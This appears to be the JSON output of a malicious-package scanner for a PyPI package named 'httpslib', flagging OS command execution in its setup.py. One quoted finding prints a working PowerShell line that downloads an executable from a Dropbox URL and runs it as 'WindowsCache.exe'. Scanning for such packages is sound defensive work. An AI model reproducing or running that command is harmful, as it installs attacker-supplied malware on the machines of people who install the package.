@@ -1,0 +1,29 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:8",
+                "code": "    os.system(\"pip install subprocess||python -m pip install subprocess\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:11",
+                "code": "  subprocess.run('powershell Invoke-WebRequest -Uri \"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/httpslib-4.6.11"
+}
